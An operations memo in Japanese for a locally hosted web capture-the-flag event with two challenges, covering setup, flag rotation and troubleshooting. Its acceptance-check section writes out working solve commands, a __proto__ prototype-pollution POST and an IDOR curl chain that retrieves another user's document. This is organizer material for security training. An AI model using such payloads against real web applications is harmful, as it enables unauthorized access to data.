[MiniDocs 運用メモ（正式版）]

目的：
- VDI 上のローカル（127.0.0.1:8000）だけで完結する Web CTF（2問：Prototype Pollution / IDOR）
- 外部ネットワーク不要・npm不要・Node（nodejs）単体で稼働

前提：
- OS: Kali Linux（まっさらでも可）
- 権限: sudo 実行が可能
- ポート: 127.0.0.1:8000 を使用（ローカルのみ）

==================================================
0) 最速セットアップ（初回のみ・推奨）
==================================================
# Zip展開後、リポジトリ直下または 02_Ops_Package/ で以下実行
sudo bash 02_Ops_Package/minidocs_setup.sh

# セットアップ後の起動/停止は下記「2) 以降」

==================================================
1) 手動セットアップ（参考：スクリプトが使えない場合）
==================================================
# ctfsvc（存在しなければ作成）
getent passwd ctfsvc >/dev/null || sudo useradd -r -s /usr/sbin/nologin ctfsvc

# Node.js（無ければ導入）
command -v node >/dev/null 2>&1 || command -v nodejs >/dev/null 2>&1 || \
  (sudo apt-get update && sudo apt-get install -y nodejs)

# 配置（02_Ops_Package から）
sudo mkdir -p /opt/web-pack/minidocs
sudo cp -a 02_Ops_Package/minidocs/{server.js,start_all.sh,stop_all.sh} /opt/web-pack/minidocs/

# 改行コード（CRLF事故対策）
sudo sed -i 's/\r$//' /opt/web-pack/minidocs/*.sh

# 権限
sudo chown -R root:ctfsvc /opt/web-pack
sudo chmod 640 /opt/web-pack/minidocs/server.js
sudo chmod 750 /opt/web-pack/minidocs/{start_all.sh,stop_all.sh}

# /tmp 領域
sudo mkdir -p /tmp/web-pack
sudo chown -R ctfsvc:ctfsvc /tmp/web-pack
sudo chmod 750 /tmp/web-pack

==================================================
2) 起動・確認・停止（運用当日）
==================================================
# 起動
sudo /opt/web-pack/minidocs/start_all.sh

# 稼働確認
ss -ltnp | grep 127.0.0.1:8000 || true
sudo tail -n +1 /tmp/web-pack/minidocs.log
# 参加者アクセス： http://127.0.0.1:8000/

# 停止
sudo /opt/web-pack/minidocs/stop_all.sh

==================================================
3) フラグ差し替え（開催直前に任意）
==================================================
# 起動時に環境変数で上書き（推奨）
sudo FLAG_PP='PCTF{pp_2025_xxx}' FLAG_IDOR='PCTF{idor_2025_xxx}' \
  /opt/web-pack/minidocs/start_all.sh

# 直接ファイル更新して再起動でも可
# echo "PCTF{pp_2025_xxx}"   | sudo tee /tmp/web-pack/FLAG_PP.txt >/dev/null
# echo "PCTF{idor_2025_xxx}" | sudo tee /tmp/web-pack/FLAG_IDOR.txt >/dev/null
# sudo chown ctfsvc:ctfsvc /tmp/web-pack/FLAG_{PP,IDOR}.txt && sudo chmod 600 /tmp/web-pack/FLAG_{PP,IDOR}.txt
# sudo /opt/web-pack/minidocs/start_all.sh

==================================================
4) 検収（フラグ取得確認・curl例）
==================================================
# PP（Prototype Pollution）
curl -s -X POST -d 'json={"__proto__":{"revealSecret":true}}' \
  http://127.0.0.1:8000/admin/config >/dev/null
curl -s http://127.0.0.1:8000/admin/info | grep -o 'PCTF{[^}]*}'

# IDOR（/leak で末尾4桁 → victim=vi）
t4=$(curl -s http://127.0.0.1:8000/leak | sed -n 's/.*doc-\*\*-\([0-9a-f]\{4\}\).*/\1/p')
curl -s "http://127.0.0.1:8000/docs/doc-vi-$t4" | grep -o 'PCTF{[^}]*}'

==================================================
5) トラブル対処（頻出）
==================================================
# A. "command not found"（CRLFの疑い）
sudo sed -i 's/\r$//' /opt/web-pack/minidocs/*.sh
sudo chmod 750 /opt/web-pack/minidocs/{start_all.sh,stop_all.sh}

# B. /tmp にログ/ PID が作れない（権限）
sudo mkdir -p /tmp/web-pack
sudo chown -R ctfsvc:ctfsvc /tmp/web-pack
sudo chmod 750 /tmp/web-pack

# C. ポート詰まり（EADDRINUSE）
sudo fuser -k 8000/tcp 2>/dev/null || true
sudo rm -f /tmp/web-pack/minidocs.pid /tmp/web-pack/minidocs.log

# D. 多重起動（プロセス残骸）
sudo pkill -f -u ctfsvc "/opt/web-pack/minidocs/server.js" 2>/dev/null || true
sudo /opt/web-pack/minidocs/start_all.sh

# E. 一発復旧（総合対処）
sudo pkill -f -u ctfsvc "/opt/web-pack/minidocs/server.js" 2>/dev/null || true
sudo fuser -k 8000/tcp 2>/dev/null || true
sudo rm -f /tmp/web-pack/minidocs.pid /tmp/web-pack/minidocs.log
sudo mkdir -p /tmp/web-pack && sudo chown -R ctfsvc:ctfsvc /tmp/web-pack && sudo chmod 750 /tmp/web-pack
sudo /opt/web-pack/minidocs/start_all.sh

==================================================
付録) 運用側 Tips（最小コマンド）
==================================================
sudo /opt/web-pack/minidocs/start_all.sh
sudo /opt/web-pack/minidocs/stop_all.sh
ss -ltnp | grep 127.0.0.1:8000 || true
sudo tail -n +1 /tmp/web-pack/minidocs.log
sudo FLAG_PP='PCTF{pp_2025_xxx}' FLAG_IDOR='PCTF{idor_2025_xxx}' /opt/web-pack/minidocs/start_all.sh
